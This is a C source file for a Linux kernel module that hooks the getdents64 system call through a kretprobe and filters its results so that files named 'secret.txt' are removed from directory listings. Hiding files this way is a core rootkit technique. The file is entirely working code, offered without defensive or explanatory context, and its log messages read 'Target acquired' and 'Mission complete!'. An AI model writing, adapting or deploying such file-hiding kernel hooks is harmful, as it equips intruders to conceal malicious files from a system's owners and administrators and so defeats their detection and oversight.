#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/kprobes.h>
#include <linux/slab.h>
#include <linux/uaccess.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("LavaTime");
MODULE_DESCRIPTION("A syscall hooking module");

#define TARGET "secret.txt"

struct linux_dirent64 {
	unsigned long d_ino;
	unsigned long d_off;
	unsigned short d_reclen;
	unsigned char d_type;
	char d_name[];
};

static int kprobe_entry_handler_hacked_getdents64(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	*((unsigned long *)ri->data) = ((struct pt_regs *)(regs->di))->si; // the entry_handler pt_regs are the kernel registers, so we must take regs->di since it's the pointer to the pt_regs of user mode :)
	return 0;
}

static int hack_getdents64(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	unsigned long ret = regs->ax;
	struct linux_dirent64* dirp = (struct linux_dirent64*)*(unsigned long*)ri->data;
	if (ret <= 0)
	{
		return 0;
	}
	else
	{
		struct linux_dirent64* kdirent;
		struct linux_dirent64* current_dir;
		unsigned long offset = 0;
		kdirent = kmalloc(ret, GFP_ATOMIC);
		if (kdirent == NULL)
		{
			return 0;
		}
		int copy_ret = copy_from_user_nofault(kdirent, dirp, ret);
		if (copy_ret != 0)
		{
			kfree(kdirent);
			return 0;
		}

		while (offset < ret)
		{
			current_dir = (struct linux_dirent64 *)((char*)kdirent + offset);

			if (!strcmp(current_dir->d_name, TARGET))
			{
				memmove(current_dir, (struct linux_dirent64 *)((void*)current_dir + current_dir->d_reclen), (ret - (current_dir->d_reclen + offset)));
				ret -= current_dir->d_reclen;
			}
			else
			{
				offset += current_dir->d_reclen;
			}
		}
		if (copy_to_user_nofault(dirp, kdirent, ret) != 0)
		{
			kfree(kdirent);
			return 0;
		}
		kfree(kdirent);
		regs->ax = ret;
		return 0;
	}
}

static struct kretprobe getdents64_kretprobe = {
	.handler = hack_getdents64,
	.entry_handler = kprobe_entry_handler_hacked_getdents64,
	.data_size = 8,
	.maxactive = 0,
	.kp = {
		.symbol_name = "__x64_sys_getdents64",
	},
};

static int __init syscall_hooking_init(void)
{
	int ret;
	ret = register_kretprobe(&getdents64_kretprobe);
	if (!ret)
	{
		printk(KERN_INFO "Syscall_hooker: Target acquired.\n");
	}
	else
	{
		printk(KERN_WARNING "Syscall_hooker: Target escaped! We'll get them next time.\n");
	}
	return ret;
}

static void __exit syscall_hooking_exit(void)
{
	unregister_kretprobe(&getdents64_kretprobe);
	printk(KERN_INFO "Syscall_hooker: Mission complete!\n");
}

module_init(syscall_hooking_init);
module_exit(syscall_hooking_exit);

